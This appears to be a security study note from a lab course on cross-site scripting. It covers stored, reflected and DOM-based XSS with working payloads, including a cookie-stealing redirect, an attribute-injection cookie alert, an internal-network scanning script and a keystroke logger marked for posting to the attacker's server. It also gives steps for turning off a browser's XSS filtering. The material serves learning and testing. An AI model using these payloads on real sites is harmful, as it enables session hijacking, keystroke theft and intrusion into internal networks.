# XSS (Cross-Site Scripting)

## Stored XSS

A website allows user input that is not sanitised.

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption><p>An example Stored XSS</p></figcaption></figure>

`<script>alert(1)</script>`

`<script>document.querySelector('#thm-title').textContent = 'Hey'</script>`

`<script>document.location='/log/'+document.cookie</script>`

## Reflected XSS

The malicious payload is part of the victims request to the website.

The website includes this payload in response back to the user.

An attacker needs to trick a victim into clicking a URL to execute their malicious payload.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>An example Reflected XSS</p></figcaption></figure>

Some browsers have in-built XSS protection.

In FireFox complete the following steps:

In URL bar: about:config

Search: browser.urlbar.filter.javascript

Change the boolean value from True to False

## DOM-Based XSS

DOM stands for **D**ocument **O**bject **M**odel and is a programming interface for HTML and XML documents.&#x20;

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption><p>DOM</p></figcaption></figure>

With **reflective** xss, an attackers payload will be injected directly on the website and will not matter when other Javascript on the site gets loaded.

```html
<html>
    You searched for <em><script>...</script></em>
</html>
```

With **DOM-Based** xss, an attackers payload will only be executed when the vulnerable Javascript code is either loaded or interacted with. It goes through a Javascript function like so:

```javascript
var keyword = document.querySelector('#search')
keyword.innerHTML = <script>...</script>
```

Example: Upload picture:

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>



`test" onmouseover="alert(document.cookie)"`



<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

## IP & Port Scanner

For example, a website could try to find if your router has a web interface at 192.168.0.1 by:

`<img src="http://192.168.0.1/favicon.ico" onload="alert('Found')" onerror="alert('Not found')">`

The following script will scan an internal network in the range 192.168.0.0 to 192.168.0.255

```javascript
<script>
    for (let i = 0; i < 256; i++) { // This is looping from 0 to 255
        let ip = '192.168.0.' + i // Creates variable for forming IP
        // Creating an image element, if the resource can load, it logs to the /logs page.
        let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
        document.body.innerHTML += code // This is adding the image element to the webpage
    }
</script> 
```

## Key Logger

<pre class="language-javascript"><code class="lang-javascript">&#x3C;script type="text/javascript">
    let l = ""; // Variable to store key-strokes in
    document.onkeypress = function (e) { // Event to listen for key presses
<strong>        l += e.key; // If user types, log it to the l variable
</strong>        console.log(l); // update this line to post to your own server
    }
&#x3C;/script> </code></pre>

